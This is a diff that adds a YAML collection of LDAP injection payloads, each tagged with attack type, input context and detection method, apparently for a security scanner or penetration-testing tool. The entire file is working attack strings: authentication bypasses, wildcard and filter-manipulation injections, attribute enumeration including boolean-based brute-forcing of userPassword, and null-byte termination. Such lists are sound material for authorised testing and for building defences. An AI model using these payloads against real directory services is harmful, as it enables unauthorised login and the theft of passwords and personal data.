@@ -1,0 +1,103 @@
+# LDAP Injection Payloads with Metadata
+# Usage: Filter by type or context for targeted testing
+
+payloads:
+  # Auth bypass
+  - payload: "*)(uid=*))(|(uid=*"
+    type: auth-bypass
+    context: [login, search]
+    detection: auth-observation
+
+  - payload: "*)(&"
+    type: auth-bypass
+    context: [login]
+    detection: auth-observation
+
+  - payload: "*)(|(password=*"
+    type: auth-bypass
+    context: [login]
+    detection: auth-observation
+
+  - payload: "admin)(&)"
+    type: auth-bypass
+    context: [login]
+    detection: auth-observation
+
+  - payload: "admin)(|(objectClass=*"
+    type: auth-bypass
+    context: [login, search]
+    detection: auth-observation
+
+  - payload: "*)(%26"
+    type: auth-bypass
+    context: [login]
+    bypass_type: url-encoding
+    detection: auth-observation
+
+  # Wildcard enumeration
+  - payload: "*"
+    type: wildcard
+    context: [search, attribute-query]
+    detection: response-count
+
+  - payload: "a*"
+    type: wildcard
+    context: [search, attribute-query]
+    detection: response-count
+    warning: "Character-by-character brute-force starting with 'a'"
+
+  - payload: "**"
+    type: wildcard
+    context: [search, attribute-query]
+    detection: response-count
+
+  # Filter manipulation - OR injection
+  - payload: ")(uid=*"
+    type: filter-manipulation
+    context: [search, attribute-query]
+    detection: response-count
+
+  - payload: ")(|(cn=*"
+    type: filter-manipulation
+    context: [search, attribute-query]
+    detection: response-count
+
+  - payload: "))(|(uid=*))(|(uid=*"
+    type: filter-manipulation
+    context: [search, attribute-query]
+    detection: response-count
+
+  # Filter manipulation - AND injection
+  - payload: ")(!(objectClass=*"
+    type: filter-manipulation
+    context: [search, attribute-query]
+    detection: response-count
+
+  - payload: "*)(objectClass=*"
+    type: filter-manipulation
+    context: [search, attribute-query]
+    detection: response-count
+
+  # Attribute enumeration
+  - payload: "admin)(|(userPassword=a*"
+    type: enumeration
+    context: [search, attribute-query]
+    detection: response-differential
+    warning: "Boolean-based password character brute-force"
+
+  - payload: "*)(mail=*"
+    type: enumeration
+    context: [search, attribute-query]
+    detection: response-count
+
+  - payload: "*)(telephoneNumber=*"
+    type: enumeration
+    context: [search, attribute-query]
+    detection: response-count
+
+  # Null-byte termination
+  - payload: "admin)%00"
+    type: auth-bypass
+    context: [login, search]
+    bypass_type: null-byte
+    detection: auth-observation
